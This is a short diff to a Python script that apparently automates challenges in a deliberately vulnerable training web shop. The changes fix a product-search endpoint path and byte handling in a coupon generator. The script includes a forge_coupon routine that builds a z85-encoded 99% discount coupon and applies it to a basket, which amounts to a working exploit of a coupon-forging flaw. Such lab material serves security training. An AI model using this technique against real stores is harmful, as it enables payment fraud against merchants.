@@ -16,7 +16,7 @@ def _build_basket_payload(productid, basketid, quantity):
 
 
 def search_products(server, session, searchterm=''):
-    search = session.get('{}/rest/product/search?q={}'.format(server, searchterm))
+    search = session.get('{}/rest/products/search?q={}'.format(server, searchterm))
     if not search.ok:
         raise RuntimeError('Error searching products: {}'.format(search.reason))
     return search.json().get('data')
@@ -101,7 +101,7 @@ def forge_coupon(server):
     payload = _build_basket_payload(2, basketid, 1)
     _add_to_basket(server, session, payload)
     couponcode = _generate_coupon()
-    print('Applying forged coupon...'),
+    print('Applying forged coupon...{}'.format(couponcode)),
     applycoupon = session.put('{}/{}/coupon/{}'.format(_get_basket_url(server), basketid, couponcode))
     if not applycoupon.ok:
         raise RuntimeError('Error applying coupon code.')
@@ -155,7 +155,7 @@ def _generate_coupon():
     now = datetime.datetime.now()
     month = now.strftime('%b').upper()
     year = now.strftime('%y')
-    return z85.encode('{month}{year}-99'.format(month=month, year=year))
+    return z85.encode(bytes('{month}{year}-99'.format(month=month, year=year),'utf-8')).decode('utf-8')
 
 
 def solve_product_challenges(server):
